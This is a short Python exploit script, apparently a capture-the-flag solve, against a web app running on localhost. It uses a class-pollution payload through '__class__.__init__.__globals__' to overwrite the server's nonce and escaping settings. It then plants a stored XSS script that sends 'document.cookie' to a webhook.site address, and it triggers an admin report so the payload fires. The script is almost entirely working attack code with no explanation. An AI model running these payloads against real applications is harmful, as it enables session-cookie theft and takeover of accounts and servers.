import httpx
import os

URL = 'http://localhost:1337'
username = os.urandom(8).hex()
xss_payload = '<script nonce="a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32">fetch("https://webhook.site/0753a095-0eed-47e0-8a6b-b509b68641b2/"+document.cookie)</script>'

client = httpx.Client()
r = client.post(f'{URL}/register', data={'username': username, 'password': 'a'})
print(r.status_code)
r = client.post(f'{URL}/login', data={'username': username, 'password': 'a'})
print(r.status_code)
r = client.post(f'{URL}/save_feedback', json={'content': 'a', 'rating': '1', 'referred': 'a', 'title': 'a', "__class__": { "__init__":{ "__globals__":{ "RANDOM_COUNT": 0, "SECRET_NONCE": "t", "TEMPLATES_ESCAPE_ALL": False } } } })
print(r.status_code)
r = client.post(f'{URL}/admin/update-accepted-templates', json={ "title":"", "content":"", "rating":"", "referred":"", "policy" : "strict" })
print(r.status_code)
r = client.post(f'{URL}/create_post', data={'title':xss_payload,'content':'x','public':'1','save':'Save+Post'})
print(r.status_code)
r = client.get(f'{URL}/api/v1/report')
print(r.status_code)
